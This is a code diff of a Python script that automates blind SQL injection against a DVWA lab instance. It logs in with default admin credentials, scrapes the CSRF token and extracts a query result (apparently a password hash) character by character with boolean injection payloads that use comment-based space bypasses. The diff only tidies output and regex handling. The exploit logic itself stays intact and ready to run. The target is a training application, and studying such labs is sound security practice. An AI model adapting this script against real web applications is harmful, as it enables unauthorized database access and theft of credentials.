@@ -16,29 +16,26 @@ def main():
     sess = login(rhost)
     sess, extracted_data = blindSqliFast(rhost, sess, my_query)
     print("")
-    print("The query result is: {}".format(extracted_data))
-    print("")
-    print("The query result is: {}".format(extracted_data))
+    print(f"The query result is: {extracted_data}")
 
 def login(rhost):
     s = requests.session()
     login_url = f"http://{rhost}/dvwa/login.php"
     req = s.get(login_url)
-    match = re.search(r'([a-z,0-9]){32}', req.text)
-    token = match.group(0)
+    match = re.search(r"(?<=<input type='hidden' name='user_token' value=')([a-z,0-9]){32}(?=')", req.text)
+    token = match.group(0) # Extracts the regex that was matched
     data = {'username':'admin','password':'password','Login':'Login','user_token':token}
     login = s.post(login_url, data=data)
     if "Welcome" in login.text:
         print("login successful")
-        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
     return s
 
 # Finds characters iterating through all ASCII characters
 def blindSqli(rhost, session_object, my_query):
     my_query = my_query.replace(" ", "/**/")
     extracted_data = ""
-    for index in range(1,33): # Length of password hash
-        for i in range(32, 126): # Loops through all ASCII characcters
+    for index in range(1,33): # Indices of password hash [1-32]
+        for i in range(32, 127): # Loops through all printable ASCII characcters
             query = f"'/**/or/**/(SELECT/**/ascii(substring(({my_query}),{index},1)))={i}/**/%23"
             r = session_object.get(f"http://{rhost}/dvwa/vulnerabilities/sqli_blind/?id={query}&Submit=Submit#")
             if "User ID exists" in r.text:
